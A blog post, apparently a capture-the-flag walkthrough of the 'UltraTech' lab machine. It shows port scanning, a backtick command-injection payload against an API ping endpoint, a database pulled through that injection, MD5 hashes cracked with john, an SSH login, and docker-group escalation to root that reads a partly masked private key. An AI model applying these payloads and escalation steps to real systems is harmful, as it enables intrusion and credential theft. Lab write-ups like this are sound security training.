---
layout: post
author: L0
---

![image](/images/Pasted image 20221115211941.png)

## Enumeration

### nmap

```shell
$ nmap -sV -p- ultratech
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-15 15:30 EST
Nmap scan report for ultratech.thm (10.10.201.122)
Host is up (0.063s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

open ports:

- `21` ftp service
- `22` ssh service
- `8081` node.js with express backend
- `31331` apache web server

> ftp login with `anonymous` does not work
> {: .prompt-warning }

### express

found an api server.

![image](/images/Pasted image 20221115213317.png)

### website

![image](/images/Pasted image 20221115212421.png)

### dirbusting with ffuf

```shell
$ ffuf -w `fzf-wordlist` -u http://ultratech.thm:31331/FUZZ

.hta                    [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 45ms]
.htaccess               [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 45ms]
.htpasswd               [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 45ms]
css                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 37ms]
                        [Status: 200, Size: 6092, Words: 393, Lines: 140, Duration: 3474ms]
favicon.ico             [Status: 200, Size: 15086, Words: 11, Lines: 7, Duration: 36ms]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 37ms]
index.html              [Status: 200, Size: 6092, Words: 393, Lines: 140, Duration: 36ms]
javascript              [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 37ms]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 35ms]
robots.txt              [Status: 200, Size: 53, Words: 4, Lines: 6, Duration: 37ms]
server-status           [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 36ms]
```

i found a robots.txt and got this result

![image](/images/Pasted image 20221115212657.png)

and `/utech_sitemap.txt` reveals this

![image](/images/Pasted image 20221115212730.png)

`partnes.html` is a login page

![image](/images/Pasted image 20221115212823.png)

the source code of the page gives a hint to a java script file that connects to the api server

![image](/images/Pasted image 20221115214057.png)

Two api endpoints are used here.

![image](/images/Pasted image 20221115214148.png)

while enumerating i found some possible users

![image](/images/Pasted image 20221115220243.png)

```shell
John McFamicom | r00t
Francois LeMytho | P4c0
Alvaro Squalo | Sq4l
```

i could not login to the partners site and also not to ssh and ftp. i also found no sqli in the login site. so i got back to the api

the ping command seems to respond with an os command execution.

![image](/images/Pasted image 20221115222734.png)

after researching i found this [link](https://www.hackerone.com/ethical-hacker/how-command-injections)

and found this payload working

```shell
http://ultratech.thm:8081/ping?ip=10.10.10.10` id`
```

![image](/images/Pasted image 20221115222843.png)

i tried to get a reverse shell but had no luck.

next i looked into the directory and found a db file.

![image](/images/Pasted image 20221115222957.png)

to get the file i launched a local python server and downloaded the db to my kali machine

```shell
http://ultratech.thm:8081/ping?ip=10.10.10.10` python -m SimpleHTTPServer`
```

standard port is `8000`

```shell
$ wget http://ultratech.thm:8000/utech.db.sqlite
```

the content looks like this

```shell
$ sqlite3 utech.db.sqlite
SQLite version 3.38.2 2022-03-26 13:51:10
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
        );
INSERT INTO users VALUES('admin','0d0ea5111e3c1def594c1684e3b9be84',0);
INSERT INTO users VALUES('r00t','f357a0c52799563c7c7b76c1e7543a32',0);
COMMIT;
```

```shell
'admin','0d0ea5111e3c1def594c1684e3b9be84'
'r00t','f357a0c52799563c7c7b76c1e7543a32'
```

john got me this result

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-md5 pw_hashes.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=5
Press 'q' or Ctrl-C to abort, almost any other key for status
n100906          (?)
mrsheafy         (?)

```

```shell
admin - mrsheafy
r00t - n100906
```

login with `r00t` credentials we got ssh access.

```shell
$ ssh r00t@ultratech.thm
The authenticity of host 'ultratech.thm (10.10.201.122)' can't be established.
ED25519 key fingerprint is SHA256:g5I2Aq/2um35QmYfRxNGnjl3zf9FNXKPpEHxMLlWXMU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ultratech.thm' (ED25519) to the list of known hosts.
r00t@ultratech.thm's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 15 21:47:40 UTC 2022

  System load:  0.0                Processes:           107
  Usage of /:   24.5% of 19.56GB   Users logged in:     0
  Memory usage: 42%                IP address for eth0: 10.10.201.122
  Swap usage:   0%


1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ ls
```

i found that user `r00t` is part of the `docker` group. lets test if we can escalate our privileges.

first list available images.

```shell
r00t@ultratech-prod:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        3 years ago         15.8MB
```

then mount root to the mount point

```shell
r00t@ultratech-prod:~$ docker run -v /root/:/mnt -it bash

bash-5.0# whoami
root
bash-5.0# ls -la
total 40
drwx------    6 root     root          4096 Mar 22  2019 .
drwxr-xr-x    1 root     root          4096 Nov 15 21:51 ..
-rw-------    1 root     root           844 Mar 22  2019 .bash_history
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
drwx------    2 root     root          4096 Mar 22  2019 .cache
drwx------    3 root     root          4096 Mar 22  2019 .emacs.d
drwx------    3 root     root          4096 Mar 22  2019 .gnupg
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-------    1 root     root             0 Mar 22  2019 .python_history
drwx------    2 root     root          4096 Mar 22  2019 .ssh
-rw-rw-rw-    1 root     root           193 Mar 22  2019 private.txt
```

and this is the private ssh key

```shell
bash-5.0# cd .ssh
bash-5.0# ls
authorized_keys  id_rsa           id_rsa.pub
bash-5.0# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
*******************************************y1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
****************************************************************
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```

root!

[L0]
